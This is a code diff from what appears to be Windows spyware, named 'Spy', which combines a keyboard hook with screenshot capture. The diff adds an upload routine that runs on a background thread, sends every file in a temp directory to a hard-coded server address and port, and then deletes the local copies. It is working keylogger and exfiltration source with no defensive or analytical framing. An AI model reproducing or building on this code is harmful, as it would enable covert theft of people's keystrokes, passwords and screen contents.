@@ -1,34 +1,22 @@
 #include "spy.h"
-#include "stash.h"
+#include "dir.h"
 #include "scrotfile.h"
 #include "kbhook.h"
 #include "screenshot.h"
 #include "task.h"
+#include "uploader.h"
 
-HINSTANCE hinst_dll = NULL;
+HANDLE Spy::mutex = NULL;
 
-EXPORT DWORD load_spy()
+void Spy::lock()
 {
-	return Spy::load(hinst_dll);
+	WaitForSingleObject(mutex, INFINITE);
 }
 
-EXPORT VOID unload_spy()
+void Spy::unlock()
 {
-	Spy::unload();
+	ReleaseMutex(mutex);
 }
-
-EXPORT VOID take_scrot()
-{
-	Spy::take_screenshot();
-}
-
-BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
-{
-	hinst_dll = hinstDLL;
-	return TRUE;
-}
-
-Stash * Spy::stash = NULL;
 
 void Spy::get_temp_fname(char * buffer, int l)
 {
@@ -64,30 +52,53 @@ void Spy::get_temp_fpath(char * buffer, const char * fname)
 	LOG("generate temp name: %s", buffer);
 }
 
-Stash * Spy::gen_stash()
+DWORD Spy::upload_async(LPVOID * dir_path)
 {
-	char * buffer = new char[MAX_PATH];
-	get_temp_fpath(buffer, SPY_TMP_FNAME_STASH);
-	Stash * stash = new Stash(buffer);
-	delete[] buffer;
-	return stash;
+	// first, we will check for network is available
+	// then begin upload all files which saved in temp dir
+	lock();
+	char * file_path = new char[MAX_PATH];
+	char * file_name = new char[MAX_PATH];
+	const char * _dir = (const char *)dir_path;
+	Dir * dir = new Dir(_dir);
+	Uploader * uploader = NULL;
+	try
+	{
+		uploader = new Uploader(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_PORT);
+		while (dir->next(file_name))
+		{
+			path_combine(file_path, _dir, file_name);
+			uploader->upload(file_path);
+			DeleteFileA(file_path);
+		}
+	}
+	catch (int error)
+	{
+		LOG_E("Upload error: %d", error);
+	}
+	catch (...) 
+	{
+		LOG_E("Unhandled error!");
+	}
+	if (uploader != NULL)
+		delete uploader;
+	delete dir;
+	delete[] file_name;
+	delete[] file_path;
+	unlock();
+	return 0;
 }
 
 DWORD Spy::load(HINSTANCE hinstance)
 {
-	stash = gen_stash();
+	mutex = CreateMutexA(NULL, false, NULL);
 	return KBHook::load(hinstance);
 }
 
 void Spy::unload()
 {
 	KBHook::unload();
-	delete stash;
-}
-
-Stash * Spy::get_stash()
-{
-	return stash;
+	CloseHandle(mutex);
 }
 
 void Spy::take_screenshot()
@@ -103,7 +114,9 @@ void Spy::take_screenshot()
 	delete buffer;
 }
 
-void Spy::upload_async()
+void Spy::notify_upload()
 {
-
+	DWORD thread_id;
+	HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)upload_async, SPY_TMP_DIR, 0, &thread_id);
+	CloseHandle(thread_handle);
 }
